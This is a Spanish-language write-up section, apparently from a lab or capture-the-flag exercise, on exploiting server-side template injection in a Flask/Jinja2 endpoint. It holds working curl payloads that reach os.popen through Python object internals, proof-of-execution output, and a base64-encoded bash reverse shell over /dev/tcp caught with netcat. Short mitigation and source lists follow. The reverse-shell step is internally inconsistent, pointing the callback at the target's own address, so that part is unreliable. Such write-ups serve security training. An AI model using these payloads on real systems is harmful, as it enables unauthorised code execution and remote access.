## SSTI

Del reconocimiento web obtenemos el siguiente archivo [con información sobre un endpoint](https://cwe.mitre.org/data/definitions/489.html), que nos indica que se puede activar el modo debug mediante una cabecera para interactuar con el renderer de `flask`.
```
root@15485da21b1b:/opt/gobuster# curl 10.1.0.8:5042/static/js/debug.js
// static/js/debug.js
// paco: internal debug helper. NEVER linked from any template — leftover.
// (found via the exposed .git repo or by dirbusting /static/js/)
window.HAL_DEBUG = {
    // Setting this request header switches /evaluate into verbose render mode,
    // so the Jinja2-rendered output is returned instead of the opaque ack.
    debug_header: "X-Debug-Render",
    schema_endpoint: "/api/internal/schema",
    // legacy maintenance console — disabled in the UI, still on the server
    debug_endpoint: "/api/debug",
    note: "X-Debug-Render: true  ->  see what the template engine actually rendered"
};
```

Realizamos una petición al endpoint.

```
curl 'http://10.1.0.8:5042/evaluate' \
  -X POST \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -H 'Referer: http://10.1.0.8:5042/' \
  --data-raw 'project_name=test'
```

Nos devuelve en el cuerpo de la respuesta `project under evaluation: test`.

La estrategia va a consistir en aprovechar que el `jinja2` del servidor va a interpretar de forma cruda el payload, por lo que abrimos el bloque de interpretación con `{{` y atravesamos dependencias hasta ejecutar un `popen` que nos permita levantar la shell remota en la máquina con un payload en `base64`.

Probamos como prueba de concepto que somos capaces de ejecutar código remoto en flask:

```bash
curl -X POST "http://10.1.0.8:5042/evaluate"   -H "X-Debug-Render: true" -d "project_name={{request.application.__globals__.__builtins__.__import__('os')['popen']('id')['read']()}}"

Project under evaluation: uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
Generamos el payload para ejecutarlo.
```bash
IP_ADDR='10.1.0.8'
PAYLOAD=$(echo "bash -i >& /dev/tcp/$IP_ADDR/4443 0>&1" | base64 | jq -rR @uri)
```

Y por último inyectamos el payload en la petición:
```bash
curl -X POST "http://$IP_ADDR:5042/evaluate"   -H "X-Debug-Render: true" -d "project_name={{ ''.__class__.__mro__[1].__subclasses__()[264].__init__.__globals__['__builtins__']['__import__']('os').popen('echo $PAYLOAD | base64 -d | bash').read() }}"
```

Obtenemos shell al acceder por `netcat` al puerto abierto remotamente:

```bash
IP_ADDR='10.1.0.8'

nc $IP_ADDR 4443`.
```

### Mitigaciones

- [M1042 - Disable or Remove Feature or Program](https://attack.mitre.org/mitigations/M1042/)
Eliminado (o restricción de acceso) de endpoints y códigos de debug innecesarios.
- [https://cwe.mitre.org/data/definitions/1336.html](https://cwe.mitre.org/data/definitions/1336.html)
En las posibles mitigaciones en la documentación de la vulnerabilidad se nos indica el uso de un motor de plantillas que restringa el input de usuario, o que se ejecute en modo **sandbox** para no acceder a información del sistema.

### Fuentes

- https://onsecurity.io/article/server-side-template-injection-with-jinja2/
- https://cwe.mitre.org/data/definitions/489.html
- https://cwe.mitre.org/data/definitions/1336.html